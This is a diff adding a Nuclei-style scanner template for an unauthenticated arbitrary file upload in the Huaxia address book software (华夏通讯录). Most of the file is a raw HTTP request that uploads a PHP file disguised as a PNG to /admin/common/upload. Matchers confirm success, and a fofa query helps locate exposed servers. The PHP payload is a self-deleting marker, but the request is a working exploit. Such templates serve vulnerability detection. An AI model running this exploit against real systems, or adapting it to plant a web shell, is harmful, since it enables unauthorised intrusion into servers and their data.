@@ -1,0 +1,44 @@
+id: huaxia-addresslist-upload-fileupload
+info:
+  name: 华夏通讯录 - upload
+  author: leadlife
+  severity: critical
+  description: 华夏通讯录存在前台由于在鉴权方面存在疏漏，导致了可未授权访问，从而通过/admin/common/upload接口进行任意文件上传。
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E5%8D%8E%E5%A4%8F%E9%80%9A%E8%AE%AF%E5%BD%95/%E5%8D%8E%E5%A4%8F%E9%80%9A%E8%AE%AF%E5%BD%95%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: icon_hash="1403225079"
+  tags: huaxia-addresslist,fileupload
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /admin/common/upload HTTP/2
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 218
+
+        -----------------------------289666258334735365651210512949
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
+        Content-Type: image/png
+
+        <?php print("{{randstr}}");unlink(__FILE__);?>
+        -----------------------------289666258334735365651210512949--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'uploads','admin','admin_thumb')
+        condition: and
